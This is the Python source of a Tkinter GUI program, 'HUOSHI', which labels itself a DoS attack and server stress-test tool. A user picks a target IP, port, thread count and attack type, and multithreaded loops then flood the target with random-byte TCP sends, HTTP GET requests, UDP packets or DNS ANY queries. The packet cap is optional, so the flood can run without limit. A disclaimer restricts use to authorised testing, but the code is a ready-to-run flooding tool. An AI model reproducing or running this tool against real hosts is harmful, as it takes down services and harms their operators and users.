import socket
import threading
import random
import time
import tkinter as tk
from tkinter import scrolledtext, messagebox
from urllib.parse import urlparse
import sys
import os
import dns.message
import dns.rdatatype
import urllib.request



def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


class DoSToolGUI:
    def __init__(self, root):
        self.root = root

        icon_path = resource_path("dosico.ico")
        if os.path.exists(icon_path):
            root.iconbitmap(icon_path)

        self.root.title("火狮 HUOSHI - 服务器压力测试 拒绝服务攻击 - DoS 网络安全 v.1.1.0")
        self.root.geometry("1000x660")
        self.root.minsize(500, 600)
        self.running = False
        self.paused = False
        self.packet_counter = 0
        self.max_packets = None
        self.threads = []
        self.lock = threading.Lock()

        self.default_font = ("Arial", 14)
        self.declaration_button_font = ("Arial", 18, "bold")

        self._build_widgets()
        self.root.after(100, self.set_log_editable_line)
        self.log_area.bind('<Control-Return>', self.handle_ctrl_enter)
        self.log_area.bind('<Control-Enter>', self.handle_ctrl_enter)

        self.requested = 0
        self.failed = 0

        self.stats_frame = tk.Frame(self.root)

        # 改为右下角：
        self.stats_frame.place(relx=1.0, rely=1.0, anchor='se', x=-10, y=-10)  # 右下角，距离边界留10像素间距

        self.requested_label = tk.Label(self.stats_frame, text="Requested: 0", font=("Arial", 10), fg="black")
        self.requested_label.pack(anchor='e')
        self.failed_label = tk.Label(self.stats_frame, text="Failed: 0", font=("Arial", 10), fg="black")
        self.failed_label.pack(anchor='e')

        self.update_stats()

    def update_stats(self):
        self.requested_label.config(text=f"Requested: {self.requested}")
        self.failed_label.config(text=f"Failed: {self.failed}")
        self.root.after(500, self.update_stats)

    def _build_widgets(self):
        declaration_button = tk.Button(self.root, text="!", font=self.declaration_button_font, fg="black",
                                       command=self.show_declaration)
        declaration_button.place(x=5, y=5, width=30, height=30)

        input_frame = tk.Frame(self.root)
        input_frame.pack(pady=10, padx=10, anchor='nw')  # 你想放在左上角
        input_frame.pack_configure(anchor='center')  # 让input_frame居中

        # 依次调用，都会水平排列
        self._create_label_entry(input_frame, "目标 IP:", "host", "127.0.0.1")
        self._create_label_entry(input_frame, "端口号:", "port", "80")
        self._create_label_entry(input_frame, "每轮发包数:", "hits", "10")
        self._create_label_entry(input_frame, "线程数:", "threads", "5")
        self._create_label_entry(input_frame, "最多发送包数 (可空):", "max_packets", "")

        tk.Label(self.root, text="攻击类型:", font=self.default_font).pack()

        self.attack_type = tk.StringVar(value="TCP")
        attack_options = ["TCP", "HTTP", "UDP", "DNS"]

        radio_frame = tk.Frame(self.root)
        radio_frame.pack()

        for option in attack_options:
            rb = tk.Radiobutton(
                radio_frame,
                text=option,
                variable=self.attack_type,
                value=option,
                font=self.default_font,
                indicatoron=0,
                width=8,
                relief=tk.RAISED
            )
            rb.pack(side=tk.LEFT, padx=5, pady=5)

        button_frame = tk.Frame(self.root)
        button_frame.pack(pady=10)

        self.start_button = tk.Button(button_frame, text="▶ 开始攻击目标 IP", font=self.default_font, command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=5)

        self.pause_button = tk.Button(button_frame, text="⏸ 暂停", font=self.default_font, state=tk.DISABLED, command=self.toggle_pause)
        self.pause_button.pack(side=tk.LEFT, padx=5)

        self.stop_button = tk.Button(button_frame, text="⏹ 停止", font=self.default_font, state=tk.DISABLED, command=self.stop_attack)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        self.exit_button = tk.Button(button_frame, text="⏻ 退出", font=self.default_font, command=self.exit_app)
        self.exit_button.pack(side=tk.LEFT, padx=5)

        self.log_color_button = tk.Button(self.root, text="终端颜色", font=self.default_font, command=self.toggle_log_colors)
        self.log_color_button.pack(pady=(0, 10))  # 输出区下面，间距10像素

        self.log_area = scrolledtext.ScrolledText(self.root, height=25, width=85, undo=True, wrap=tk.WORD, font=self.default_font)
        self.log_area.pack(padx=10, pady=10)


        self.log("[系统] huoshi // 您正在使用 火狮 HUOSHI DoS 拒绝服务攻击 服务器压力测试 工具 请先点击左上方的按钮了解一下本工具的正确使用方法。 ///")
        self.prompt()

        self.log_color_mode = False

    def toggle_log_colors(self):
        if not self.log_color_mode:
            # 切换成黑底绿字
            self.log_area.config(bg="black", fg="lime", insertbackground="lime")
            self.log_color_mode = True
            self.log("[$ dark color done] 输出口已切换为 暗黑 模式。")
        else:
            # 切换回默认背景和字体颜色
            self.log_area.config(bg="white", fg="black")
            self.log_color_mode = False
            self.log("[$ default color done] 输出口已恢复为 默认颜色 模式。")
        self.prompt()

    def _create_label_entry(self, parent, label_text, attr_name, default=""):
        frame = tk.Frame(parent)
        frame.pack(side=tk.LEFT, padx=5)
        label = tk.Label(frame, text=label_text, font=self.default_font)
        label.pack()
        entry = tk.Entry(frame, width=15, font=self.default_font)
        entry.insert(0, default)
        entry.pack()
        setattr(self, f"{attr_name}_entry", entry)


    def show_declaration(self):
        declaration_text = (
            "免责声明：该工具 DoS (Denial of Service) 服务器压力测试，是为了网络安全用途，\n"
            "只允许在获得授权的情况下进行测试，切勿将其利用于其他服务器。\n"
            "违法使用将导致严重后果，请严格遵守当地法律法规。\n"
            "使用本工具产生的一切后果与开发者无关。\n"
            "\n"
            "命令: \n"
            "- 您可以在 工具的终端内输入 sudo nslookup https://www.example.com 写入您想要的网址域名 之后按下 ctrl + enter 回车键 进行输出，这样就能够获取目标靶机 IP\n"
            "\n"
            "- 在终端输入 sudo ip addr show 命令，能够查看您的 system 设备 名称，局域网IP 和 公网IP。\n"
            "\n"
            "控制好攻击数量避免对自己的设备 造成 资源耗尽和网络信号变弱，一般是能够恢复正常。"
        )
        messagebox.showinfo("huoshi: 重要声明", declaration_text)

    def log(self, msg):
        self.log_area.config(state=tk.NORMAL)
        content = self.log_area.get("1.0", tk.END)
        if content.rstrip().endswith(">>>"):
            self.log_area.delete("end-4c", "end")

        timestamp = time.strftime("[%H:%M:%S] ")
        self.log_area.insert(tk.END, timestamp + msg + "\n")
        self.log_area.see(tk.END)
        self.prompt()

    def prompt(self):
        self.log_area.config(state=tk.NORMAL)
        content = self.log_area.get("1.0", tk.END).rstrip()
        if not content.endswith(">>>"):
            self.log_area.insert(tk.END, ">>> ")
        self.log_area.mark_set("insert", tk.END)
        self.log_area.see(tk.END)

    def get_last_command(self):
        content = self.log_area.get("1.0", tk.END).strip()
        lines = content.split('\n')
        for line in reversed(lines):
            if line.startswith(">>> "):
                return line[4:].strip()
        return ""

    def handle_ctrl_enter(self, event):
        cmd = self.get_last_command()
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, "\n")
        if cmd.startswith("sudo nslookup "):
            raw_target = cmd[len("sudo nslookup "):].strip()
            if not raw_target.startswith("http://") and not raw_target.startswith("https://"):
                raw_target = "http://" + raw_target
            try:
                hostname = urlparse(raw_target).hostname
                ip = socket.gethostbyname(hostname)
                self.log(f"done {hostname} huoshi >> sudo nslookup completed >> IP: {ip}")
            except Exception as e:
                self.log(f"✖ huoshi error 无法解析 {raw_target}，错误: {e}")

        elif cmd.strip() == "sudo ip addr show":
            try:
                # 本机主机名和内网IP
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)

                # 尝试用UDP连接一个公网IP地址获取本机IP（更准确的内网IP）
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
                except Exception:
                    pass
                finally:
                    s.close()

                # 获取公网IP
                public_ip = "未知"
                try:
                    with urllib.request.urlopen("https://api.ipify.org") as response:
                        public_ip = response.read().decode().strip()
                except Exception as e:
                    public_ip = f"获取失败: {e}"

                self.log(f"$ System 主机名....................: {hostname}")
                self.log(f"$ IPv4 本机内网IP....................: {local_ip}")
                self.log(f"$ Public 公网IP....................: {public_ip}")
            except Exception as e:
                self.log(f"✖ 获取IP信息失败: {e}")


        else:
            self.log(f"✖ huoshi error code 未知命令: {cmd}")
        self.prompt()
        self.set_log_editable_line()
        return "break"

    def set_log_editable_line(self):
        self.log_area.config(state=tk.NORMAL)
        self.log_area.mark_set("insert", tk.END)
        self.log_area.see(tk.END)

    def start_attack(self):
        if self.running:
            self.log("⚠ 压力测试正在运行中。")
            self.log_area.config(state=tk.DISABLED)
            return

        self.requested = 0
        self.failed = 0

        try:
            host = self.host_entry.get()
            port = int(self.port_entry.get())
            hits = int(self.hits_entry.get())
            threads = int(self.threads_entry.get())
            max_packets_str = self.max_packets_entry.get().strip()
            self.max_packets = int(max_packets_str) if max_packets_str else None
            ip = socket.gethostbyname(host)
        except Exception as e:
            messagebox.showerror("输入错误 请确认您的目标 IP 是否正确", f"错误: {e}")
            return

        self.packet_counter = 0
        self.running = True
        self.paused = False
        self.log_area.config(state=tk.NORMAL)
        self.log_area.delete('1.0', tk.END)
        self.log(f"⏻ 攻击开始 -> IP: {ip}, 端口: {port}, 每轮发包: {hits}, 线程数: {threads}, 最大包数: {self.max_packets or '∞'}, 攻击类型: {self.attack_type.get()}")
        self.prompt()

        self.pause_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.NORMAL)
        self.start_button.config(state=tk.DISABLED)

        self.threads = []
        for _ in range(threads):
            t = threading.Thread(target=self.attack_thread, args=(ip, port, hits, self.attack_type.get()))
            t.daemon = True
            t.start()
            self.threads.append(t)

    def toggle_pause(self):
        self.paused = not self.paused
        self.log_area.config(state=tk.NORMAL)
        if self.paused:
            self.log("⏸ 发包已暂停")
            self.pause_button.config(text="▶ 恢复", bg="lightgreen")
        else:
            self.log("▶ 发包已恢复")
            self.pause_button.config(text="⏸ 暂停", bg="orange")

    def stop_attack(self):
        self.running = False
        self.paused = False
        self.log("⏻ 已停止所有线程")
        self.pause_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.DISABLED)
        self.start_button.config(state=tk.NORMAL)
        self.log_area.config(state=tk.NORMAL)
        self.prompt()

    def exit_app(self):
        self.stop_attack()
        self.root.destroy()

    def attack_thread(self, ip, port, hits, attack_type):
        while self.running:
            if self.paused:
                time.sleep(0.3)
                continue
            try:
                if attack_type == "DNS":
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    target_port = 53
                elif attack_type == "UDP":
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    target_port = port
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    s.connect((ip, port))
                    target_port = port

                for _ in range(hits):
                    if not self.running or self.paused:
                        break
                    with self.lock:
                        if self.max_packets and self.packet_counter >= self.max_packets:
                            self.log("[·] 达到最大包数，已自动停止。")
                            self.stop_attack()
                            return
                        self.packet_counter += 1
                        current = self.packet_counter

                    if attack_type == "TCP":
                        data = random._urandom(1024)
                        s.send(data)
                        with self.lock:
                            self.requested += 1
                        self.log(f"done 发送包 #{current}")
                    elif attack_type == "HTTP":
                        data = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: huoshi DoS Tool\r\nConnection: Keep-Alive\r\n\r\n".encode()
                        s.send(data)

                        with self.lock:
                            self.requested += 1
                        self.log(f"done 发送包 #{current} HTTP请求")
                    elif attack_type == "UDP":
                        data = random._urandom(1024)
                        s.sendto(data, (ip, target_port))

                        with self.lock:
                            self.requested += 1
                        self.log(f"done 发送包 #{current} UDP请求")

                    elif attack_type == "DNS":
                        domain = f"{random.randint(1, 9999)}.example.com"  # 模拟不同子域
                        try:
                            # 构造复杂的 DNS 查询
                            query = dns.message.make_query(domain, dns.rdatatype.ANY)
                            query.id = random.randint(0, 65535)  # 避免重复ID
                            data = query.to_wire()
                            s.sendto(data, (ip, target_port))

                            query = dns.message.make_query(domain, random.choice([
                            dns.rdatatype.A, dns.rdatatype.AAAA,
                            dns.rdatatype.MX, dns.rdatatype.NS,
                            dns.rdatatype.TXT, dns.rdatatype.CNAME,
                            ]))

                            with self.lock:
                                self.requested += 1
                            self.log(f"done 发送包 #{current} DNS请求 -> {domain}")

                        except Exception as e:
                            with self.lock:
                                self.failed += 1
                            self.log(f"✖ DNS构造失败: {e}")


                    else:
                        self.log(f"✖ 不支持的攻击类型: {attack_type}")
                    time.sleep(0.005)

                if attack_type in ("TCP", "HTTP"):
                    s.close()

            except Exception as e:
                with self.lock:
                    self.failed += 1
                self.log(f"✖ 错误: {e}")
                time.sleep(1)


if __name__ == "__main__":
    root = tk.Tk()
    app = DoSToolGUI(root)
    root.mainloop()